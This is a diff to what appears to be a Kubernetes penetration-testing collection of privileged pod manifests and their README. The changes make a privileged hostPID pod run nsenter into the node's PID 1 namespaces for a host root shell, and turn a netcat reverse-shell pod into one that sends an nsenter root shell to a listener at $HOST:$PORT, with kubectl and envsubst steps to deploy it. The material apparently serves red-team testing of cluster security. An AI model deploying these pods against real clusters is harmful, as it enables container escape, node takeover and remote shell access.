@@ -20,8 +20,8 @@ spec:
   containers:
   - name: priv-and-hostpid
     image: ubuntu
-    command: [ "/bin/bash", "-c", "--" ]    
-    args: [ "while true; do sleep 30; done;" ]
+    command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]
+    tty: true
     securityContext:
       privileged: true
     #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  restartPolicy: Always
@@ -67,8 +67,7 @@ spec:
     volumeMounts:
     - mountPath: /host
       name: noderoot
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+    command: [ "/bin/nc", "$HOST", "$PORT", "-e", "/bin/nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
     #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  volumes:
   - name: noderoot
     hostPath:
@@ -84,8 +83,7 @@ nc -nvlp 3112
 #### Create the pod
 ```bash
 # Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3112" 
-envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
 ```
 
 #### Catch the shell and chroot to /host 
